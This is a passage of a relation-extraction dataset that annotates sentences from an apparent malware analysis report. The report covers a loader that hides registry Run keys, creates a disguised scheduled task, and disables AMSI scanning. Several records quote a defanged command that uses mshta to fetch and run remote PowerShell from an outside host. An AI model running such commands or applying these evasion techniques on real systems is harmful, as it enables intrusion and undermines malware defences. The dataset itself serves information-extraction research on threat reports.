7], "h": 5, "t": 8}, {"r": "EX", "evidence": [5, 6, 7], "t": 6, "h": 8}]}, {"title": "05-6", "sents": [["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "autorunnn.exe", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [22, 22], "name": "registry entry", "pos": [22, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "explorer.exe", "pos": [8, 9], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [115, 115], "name": "PowerShell loader", "pos": [24, 26], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [120, 120], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "PowerShell", "pos": [3, 4], "index": "8_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [168, 168], "name": "registry entry", "pos": [17, 19], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "RF", "evidence": [4], "h": 5, "t": 7}, {"r": "FR", "evidence": [4, 5, 6], "h": 5, "t": 8}, {"r": "EX", "evidence": [4, 5, 6], "t": 6, "h": 8}, {"r": "RD", "evidence": [6, 7], "h": 8, "t": 9}, {"r": "RD", "evidence": [6, 7], "h": 8, "t": 9}, {"r": "WR", "evidence": [6, 7], "h": 8, "t": 9}]}, {"title": "05-7", "sents": [["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "explorer.exe", "pos": [8, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "it", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "PowerShell loader", "pos": [24, 26], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [95, 95], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [116, 116], "name": "PowerShell", "pos": [3, 4], "index": "6_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [143, 143], "name": "registry entry", "pos": [17, 19], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [163, 163], "name": "PowerShell loader", "pos": [5, 7], "index": "8_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "WR", "evidence": [3], "h": 3, "t": 4}, {"r": "RF", "evidence": [3], "h": 3, "t": 5}, {"r": "FR", "evidence": [3, 4, 5], "h": 3, "t": 6}, {"r": "EX", "evidence": [3, 4, 5], "t": 4, "h": 6}, {"r": "RD", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "RD", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "WR", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "CO", "evidence": [5, 6, 7], "h": 6, "t": 8}]}, {"title": "05-8", "sents": [["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "explorer.exe", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "it", "pos": [11, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "PowerShell loader", "pos": [24, 26], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [68, 68], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "PowerShell", "pos": [3, 4], "index": "5_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [116, 116], "name": "registry entry", "pos": [17, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [136, 136], "name": "PowerShell loader", "pos": [5, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [140, 140], "name": "loader", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [159, 159], "name": "PowerShell process", "pos": [20, 22], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "RF", "evidence": [2], "h": 2, "t": 4}, {"r": "FR", "evidence": [2, 3, 4], "h": 2, "t": 5}, {"r": "EX", "evidence": [2, 3, 4], "t": 3, "h": 5}, {"r": "RD", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "RD", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "WR", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "CO", "evidence": [4, 5, 6], "h": 5, "t": 7}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 5, "t": 8}, {"r": "RD", "evidence": [5, 6, 7], "t": 6, "h": 9}, {"r": "RD", "evidence": [5, 6, 7], "t": 6, "h": 9}, {"r": "WR", "evidence": [5, 6, 7], "t": 6, "h": 9}, {"r": "RD", "evidence": [5, 6, 7], "t": 6, "h": 9}, {"r": "RD", "evidence": [5, 6, 7], "t": 6, "h": 9}, {"r": "WR", "evidence": [5, 6, 7], "t": 6, "h": 9}]}, {"title": "05-9", "sents": [["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "it", "pos": [11, 12], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "PowerShell loader", "pos": [24, 26], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [48, 48], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "PowerShell", "pos": [3, 4], "index": "3_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [96, 96], "name": "registry entry", "pos": [17, 19], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [116, 116], "name": "PowerShell loader", "pos": [5, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "loader", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "PowerShell process", "pos": [20, 22], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "PowerShell code", "pos": [2, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [151, 151], "name": "auxiliary", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "payloads", "pos": [11, 12], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 0, "t": 1}, {"r": "RF", "evidence": [1], "h": 0, "t": 2}, {"r": "FR", "evidence": [1, 2, 3], "h": 0, "t": 3}, {"r": "EX", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "RD", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "RD", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "WR", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4, 5], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 3, "t": 6}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 3, "t": 8}, {"r": "RD", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "RD", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "WR", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "RD", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "RD", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "WR", "evidence": [4, 5, 6], "t": 4, "h": 7}, {"r": "WR", "evidence": [7], "h": 8, "t": 9}, {"r": "WR", "evidence": [7], "h": 8, "t": 10}]}, {"title": "05-10", "sents": [["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "it", "pos": [11, 12], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "PowerShell loader", "pos": [24, 26], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [29, 29], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "PowerShell", "pos": [3, 4], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [77, 77], "name": "registry entry", "pos": [17, 19], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "PowerShell loader", "pos": [5, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "loader", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [120, 120], "name": "PowerShell process", "pos": [20, 22], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [126, 126], "name": "PowerShell code", "pos": [2, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [132, 132], "name": "auxiliary", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "payloads", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "payload", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "payload", "pos": [19, 20], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [168, 168], "name": "RegSvcs.exe", "pos": [31, 32], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "EX", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 3, "t": 6}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 3, "t": 8}, {"r": "RD", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "RD", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "WR", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "RD", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "RD", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "WR", "evidence": [3, 4, 5], "t": 4, "h": 7}, {"r": "FR", "evidence": [5, 6, 7], "h": 7, "t": 13}, {"r": "WR", "evidence": [6], "h": 8, "t": 9}, {"r": "WR", "evidence": [6], "h": 8, "t": 10}, {"r": "FR", "evidence": [6, 7], "h": 8, "t": 11}, {"r": "EX", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "CO", "evidence": [7], "t": 11, "h": 12}]}, {"title": "05-11", "sents": [["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "PowerShell", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [41, 41], "name": "registry entry", "pos": [17, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "PowerShell loader", "pos": [5, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [65, 65], "name": "loader", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "PowerShell process", "pos": [20, 22], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "PowerShell code", "pos": [2, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "auxiliary", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "payloads", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [113, 113], "name": "payload", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "payload", "pos": [19, 20], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [132, 132], "name": "RegSvcs.exe", "pos": [31, 32], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [134, 134], "name": "Killamsi.dll", "pos": [0, 1], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "RD", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 3}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 0, "t": 5}, {"r": "RD", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "RD", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "WR", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "RD", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "RD", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "WR", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "FR", "evidence": [4, 5, 6], "h": 4, "t": 10}, {"r": "WR", "evidence": [5], "h": 5, "t": 6}, {"r": "WR", "evidence": [5], "h": 5, "t": 7}, {"r": "FR", "evidence": [5, 6], "h": 5, "t": 8}, {"r": "FR", "evidence": [5, 6, 7], "h": 5, "t": 11}, {"r": "EX", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "CO", "evidence": [6], "t": 8, "h": 9}, {"r": "EX", "evidence": [5, 6, 7], "t": 6, "h": 11}]}, {"title": "05-12", "sents": [["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "PowerShell", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [30, 30], "name": "registry entry", "pos": [17, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "PowerShell loader", "pos": [5, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "loader", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "PowerShell process", "pos": [20, 22], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "PowerShell code", "pos": [2, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "auxiliary", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "payloads", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "payload", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "payload", "pos": [19, 20], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [121, 121], "name": "RegSvcs.exe", "pos": [31, 32], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "Killamsi.dll", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [147, 147], "name": "DLL", "pos": [1, 2], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [161, 161], "name": "amsi.dll", "pos": [15, 16], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 5}, {"r": "RD", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "RD", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "RD", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "RD", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2, 3], "t": 1, "h": 4}, {"r": "FR", "evidence": [3, 4, 5], "h": 4, "t": 10}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 5, "t": 7}, {"r": "FR", "evidence": [4, 5], "h": 5, "t": 8}, {"r": "FR", "evidence": [4, 5, 6], "h": 5, "t": 11}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "CO", "evidence": [5], "t": 8, "h": 9}, {"r": "RD", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "EX", "evidence": [4, 5, 6], "t": 6, "h": 11}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 12}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "05-13", "sents": [["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [17, 